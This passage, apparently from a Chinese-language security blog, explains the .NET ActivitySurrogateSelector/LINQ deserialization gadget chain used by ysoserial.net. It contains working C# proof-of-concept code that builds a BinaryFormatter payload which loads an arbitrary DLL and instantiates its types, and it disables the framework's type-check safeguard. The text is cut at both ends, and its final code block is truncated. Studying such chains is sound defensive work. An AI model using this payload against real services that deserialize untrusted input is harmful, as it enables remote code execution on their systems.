class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SoapDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Person</span>(<span class="params"><span class="built_in">string</span> name</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">ToString</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">PersonSerializeSurrogate</span> : <span class="title">ISerializationSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">Object obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> p = (Person)obj;</span><br><span class="line">            info.AddValue(<span class="string">&quot;Name&quot;</span>, p.Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">SetObjectData</span>(<span class="params">Object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> p = (Person)obj;</span><br><span class="line">            p.Name = info.GetString(<span class="string">&quot;Name&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(<span class="string">&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            SoapFormatter fmt = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            MemoryStream stm = <span class="keyword">new</span> MemoryStream();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> ss = <span class="keyword">new</span> SurrogateSelector();</span><br><span class="line">            ss.AddSurrogate(<span class="keyword">typeof</span>(Person), <span class="keyword">new</span> StreamingContext(StreamingContextStates.All), <span class="keyword">new</span> PersonSerializeSurrogate());</span><br><span class="line">            fmt.SurrogateSelector = ss;</span><br><span class="line">            fmt.Serialize(stm, <span class="keyword">new</span> Person(<span class="string">&quot;jack&quot;</span>));</span><br><span class="line">            stm.Position = <span class="number">0</span>;</span><br><span class="line">            Console.WriteLine(fmt.Deserialize(stm));</span><br><span class="line"></span><br><span class="line">            stm.Position = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">var</span> fmt2 = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            Console.WriteLine(fmt2.Deserialize(stm));</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240304143050997.png" alt="image-20240304143050997"></p><p><img src="../images/image-20240304143243374.png" alt="image-20240304143243374"></p><p>这里的话输出jack是因为我们使用的第一个formatter是设置了代理器的  下面报错的异常是因为第二个formatter没有设置代理  并在在真实环境中  对方的系统用的formatter也不会设置代理器  </p><p>再来看这条链，牛就牛在发现了<a href="https://msdn.microsoft.com/en-us/library/system.workflow.componentmodel.serialization.activitysurrogateselector(v=vs.110">ActivitiySurrogateSelector</a>.aspx)这个类中的ObjectSurrogate，通过这个内部类我们可以反序列化任何对象。看一下这个类的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"></span><br><span class="line">namespace SoapDeserialization</span><br><span class="line">&#123;</span><br><span class="line">    class NonSerializable</span><br><span class="line">    &#123;</span><br><span class="line">        private string _text;</span><br><span class="line"></span><br><span class="line">        public NonSerializable(string text)</span><br><span class="line">        &#123;</span><br><span class="line">            _text = text;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public override string ToString()</span><br><span class="line">        &#123;</span><br><span class="line">            return _text;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Custom serialization surrogate</span><br><span class="line">    class MySurrogateSelector : SurrogateSelector</span><br><span class="line">    &#123;</span><br><span class="line">        public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)</span><br><span class="line">        &#123;</span><br><span class="line">            selector = this;</span><br><span class="line">            if (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;);</span><br><span class="line">                return (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line">            return base.GetSurrogate(type, context, out selector);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        public static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;, &quot;true&quot;);</span><br><span class="line">            SoapFormatter fmt = new SoapFormatter();</span><br><span class="line">            MemoryStream stm = new MemoryStream();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            fmt.SurrogateSelector = new MySurrogateSelector();</span><br><span class="line">            fmt.Serialize(stm, new NonSerializable(&quot;Hello World!&quot;));</span><br><span class="line">            stm.Position = 0;</span><br><span class="line"></span><br><span class="line">            var fmt2 = new SoapFormatter();</span><br><span class="line">            Console.WriteLine(fmt2.Deserialize(stm));</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240304143828496.png" alt="image-20240304143828496"></p><p>没有报错   正常运行  </p><p>NonSerializable仍然没有标记Serializable，但是在获取代理器的时候返回了一个ActivitySurrogateSelector+ObjectSurrogate的实例，使得NonSerializable类仍旧可以被序列化。并且fmt2并没有指定代理选择器的前提下，仍然可以正常反序列化对象，这样就解决了上文的限制。</p><p>我们跟进ActivitySurrogateSelector中的ObjectSurrogate类  这个是ActivitySurrogateSelector的一个内部类</p><p><img src="../images/image-20240304150013131.png" alt="image-20240304150013131"></p><p>重点是在这里  它做了一段处理<code>info.SetType(typeof (ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef));</code>它将我们序列化的类的属性设置为了ObjectSerializedRef，我们再看看这个类。</p><p><img src="../images/image-20240304150123110.png" alt="image-20240304150123110"></p><p>这个类还是可以进行序列化和反序列化的   这就说明了  我们现在可以使用该类来将本不可以进行反序列化的类进行反序列化了  这样久避免了目标中的formatter没有设置代理从而不能反序列化的问题 这样我们的攻击面也更广了</p><h2 id="LINQ"><a href="#LINQ" class="headerlink" title="LINQ"></a>LINQ</h2><p>LINQ是C#中的语言集成查询语法，像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">    var word = &quot;hello from linq.&quot;;</span><br><span class="line">    var words = word.Split(&#x27; &#x27;);</span><br><span class="line">    var q1 = from s in words</span><br><span class="line">        where s.ToLower().Contains(&#x27;o&#x27;)</span><br><span class="line">        select s;</span><br><span class="line">    Console.WriteLine(q1);</span><br><span class="line">    foreach (var item in q1)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(item);</span><br><span class="line">    &#125;</span><br><span class="line">    Console.ReadKey();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有点像Codeql的查询语法  输出</p><p><img src="../images/image-20240304150839810.png" alt="image-20240304150839810"></p><p>他会返回一个Enumerable迭代对象当做查询结果。并且LINQ有一个特性叫做延迟执行，也就是说当语句执行到<code>var q1 = from s in words where s.ToLower().Contains(&#39;o&#39;) select s;</code><br>这一步的时候，它并不会执行select语句，它需要被当做enumerable对象的时候会自动触发，也就是上述demo中的<code>foreach (var item in q1)</code><br>结合上面说的攻击面扩大，我们可以反序列化LINQ对象进行命令执行，基本的触发链如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">    List&lt;byte[]&gt; data = new List&lt;byte[]&gt;();</span><br><span class="line">    data.Add(File.ReadAllBytes(&quot;C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\ExpClass.dll&quot;));</span><br><span class="line">    var e1 = data.Select(Assembly.Load);</span><br><span class="line">    Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt; map_type = (Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;)Delegate.CreateDelegate(typeof(Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;), typeof(Assembly).GetMethod(&quot;GetTypes&quot;));</span><br><span class="line">    var e2 = e1.SelectMany(map_type);</span><br><span class="line">    var e3 = e2.Select(Activator.CreateInstance);</span><br><span class="line">    foreach (var o in e3)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终执行到CreateInstance里面实例化任意类，实例化的话就能执行dll中的构造函数了</p><p>最后执行还是靠 <code>foreach (var o in e3)&#123;Console.WriteLine(o);&#125;</code>  这个的话就是会执行上面的select语句</p><h3 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>ysoserial.net给出的调用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEnumerable -&gt; PagedDataSource -&gt; ICollection</span><br><span class="line">ICollection -&gt; AggregateDictionary -&gt; IDictionary</span><br><span class="line">IDictionary -&gt; DesignerVerb -&gt; ToString</span><br></pre></td></tr></table></figure><p>最终都是会进行进入到这个遍历IEnumerable对象来触发的  我们挨个来来看</p><p>其中属性dataSource是IEnumerable类型，因此可以承接上终点的LINQ，又因为PagedDataSource是ICollection的子类，因此可以往上强转，最终到了<code>AggregateDictionary</code></p><p><img src="../images/image-20240304170005184.png" alt="image-20240304170005184"></p><p>这里进行了遍历  触发了Enumberable  那么我们只要将_dictionaries参数赋值为PagedDataSource  那么就可以连起来了  <code>AggregateDictionary</code>继承IDictionary，因此继续往上看。</p><p>  <img src="../images/image-20240304170515341.png" alt="image-20240304170515341"></p><p>这里把一些重点方法拿出来了。可以看到ToString的地方配合上Text字段的getter方法可以接上<code>AggregateDictionary</code>，我们只需要将properties设置为<code>AggregateDictionary</code>即可。因此最终来到了如何触发ToString方法上，这里Ysoserial中使用的是HashTable。</p><p>Hashtable在反序列化的时候会重新建key集合。引发异常的话就会触发ToString</p><p>最终POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Collections;</span><br><span class="line">using System.ComponentModel.Design;</span><br><span class="line">using System.Data;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Web.UI.WebControls;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"></span><br><span class="line">namespace ysoserial.Generators</span><br><span class="line">&#123;</span><br><span class="line">    public class MySurrogateSelector : SurrogateSelector</span><br><span class="line">    &#123;</span><br><span class="line">        public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)</span><br><span class="line">        &#123;</span><br><span class="line">            selector = this;</span><br><span class="line">            if (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;);</span><br><span class="line">                return (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return base.GetSurrogate(type, context, out selector);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">     [Serializable]</span><br><span class="line">    public class PayloadClass : ISerializable</span><br><span class="line">    &#123;</span><br><span class="line">        protected byte[] assemblyBytes;</span><br><span class="line">        protected int variant_number = 1;</span><br><span class="line">        public PayloadClass()</span><br><span class="line">        &#123;</span><br><span class="line">            this.assemblyBytes = File.ReadAllBytes(&quot;C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\ExpClass.dll&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        private IEnumerable&lt;TResult&gt; CreateWhereSelectEnumerableIterator&lt;TSource, TResult&gt;(IEnumerable&lt;TSource&gt; src, Func&lt;TSource, bool&gt; predicate, Func&lt;TSource, TResult&gt; selector)</span><br><span class="line">        &#123;</span><br><span class="line">            Type t = Assembly.Load(&quot;System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;)</span><br><span class="line">              .GetType(&quot;System.Linq.Enumerable+WhereSelectEnumerableIterator`2&quot;)</span><br><span class="line">              .MakeGenericType(typeof(TSource), typeof(TResult));</span><br><span class="line">            return t.GetConstructors()[0].Invoke(new object[] &#123; src, predicate, selector &#125;) as IEnumerable&lt;TResult&gt;;</span><br><span class="line">        &#125;</span><br><span class="line">        protected PayloadClass(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public List&lt;object&gt; GadgetChains()</span><br><span class="line">        &#123;</span><br><span class="line">            DesignerVerb verb = null;</span><br><span class="line">            Hashtable ht = null;</span><br><span class="line">            List&lt;object&gt; ls = null;</span><br><span class="line">            List&lt;byte[]&gt; data = new List&lt;byte[]&gt;();</span><br><span class="line">            data.Add(this.assemblyBytes);</span><br><span class="line">            var e1 = data.Select(Assembly.Load);</span><br><span class="line">            Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt; map_type = (Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;)Delegate.CreateDelegate(typeof(Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;), typeof(Assembly).GetMethod(&quot;GetTypes&quot;));</span><br><span class="line">            var e2 = e1.SelectMany(map_type);</span><br><span class="line">            var e3 = e2.Select(Activator.CreateInstance);</span><br><span class="line">            PagedDataSource pds = new PagedDataSource() &#123; DataSource = e3 &#125;;</span><br><span class="line">            IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType(&quot;System.Runtime.Remoting.Channels.AggregateDictionary&quot;), pds);</span><br><span class="line">            verb = new DesignerVerb(&quot;&quot;, null);</span><br><span class="line">            typeof(MenuCommand).GetField(&quot;properties&quot;, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);</span><br><span class="line">            ls = new List&lt;object&gt;();</span><br><span class="line">            ls.Add(e1);</span><br><span class="line">            ls.Add(e2);</span><br><span class="line">            ls.Add(e3);</span><br><span class="line">            ls.Add(pds);</span><br><span class="line">            ls.Add(verb);</span><br><span class="line">            ls.Add(dict);</span><br><span class="line">            ht = new Hashtable();</span><br><span class="line">            ht.Add(verb, &quot;&quot;);</span><br><span class="line">            ht.Add(&quot;&quot;, &quot;&quot;);</span><br><span class="line">            FieldInfo fi_keys = ht.GetType().GetField(&quot;buckets&quot;, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">            Array keys = (Array)fi_keys.GetValue(ht);</span><br><span class="line">            FieldInfo fi_key = keys.GetType().GetElementType().GetField(&quot;key&quot;, BindingFlags.Public | BindingFlags.Instance);</span><br><span class="line">            for (int i = 0; i &lt; keys.Length; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                object bucket = keys.GetValue(i);</span><br><span class="line">                object key = fi_key.GetValue(bucket);</span><br><span class="line">                if (key is string)</span><br><span class="line">                &#123;</span><br><span class="line">                    fi_key.SetValue(bucket, verb);</span><br><span class="line">                    keys.SetValue(bucket, i);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fi_keys.SetValue(ht, keys);</span><br><span class="line"></span><br><span class="line">            ls.Add(ht);</span><br><span class="line"></span><br><span class="line">            return ls;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public byte[] GadgetChainsToBinaryFormatter()</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;object&gt; ls = GadgetChains();</span><br><span class="line">            MemoryStream stm = new MemoryStream();</span><br><span class="line">            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();</span><br><span class="line">            fmt.SurrogateSelector = new MySurrogateSelector();</span><br><span class="line">            fmt.Serialize(stm, ls);</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            return stm.ToArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void GetObjectData(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Trace.WriteLine(&quot;In GetObjectData&quot;);</span><br><span class="line">            info.SetType(typeof(System.Windows.Forms.AxHost.State));</span><br><span class="line">            info.AddValue(&quot;PropertyBagBinary&quot;, GadgetChainsToBinaryFormatter());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public class Exp</span><br><span class="line">    &#123;</span><br><span class="line">        public static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;, &quot;true&quot;);</span><br><span class="line"></span><br><span class="line">            PayloadClass payload = new PayloadClass();</span><br><span class="line">            using (MemoryStream memoryStream = new MemoryStream(payload.GadgetChainsToBinaryFormatter()))</span><br><span class="line">            &#123;</span><br><span class="line">                // 构建formatter</span><br><span class="line">                // SoapFormatter sp1 = new SoapFormatter();</span><br><span class="line">                // sp1.Serialize(memoryStream, payload);</span><br><span class="line">                memoryStream.Position = 0;</span><br><span class="line">                // var sp2=new SoapFormatter();</span><br><span class="line">                var bn=new BinaryFormatter();</span><br><span class="line">                bn.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240304170818822.png" alt="image-20240304170818822"></p><p>虽然也可以弹窗，但是这个payload会报错，在实战中可能会导致利用失败，为了避免这种情况，ysoserial选择了一种二次反序列化的做法。</p><h3 id="AxHost-State"><a href="#AxHost-State" class="headerlink" title="AxHost.State"></a>AxHost.State</h3><p><img src="../images/image-20240304171015417.png" alt="image-20240304171015417"></p><p>在反序列化的时候他会对PropertyBagBinary进行binary反序列化。</p><p><img src="../images/image-20240304171116749.png" alt="image-20240304171116749"></p><p>最主要的是这里还做了异常处理，就避免了异常发生。</p><p>最终poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span 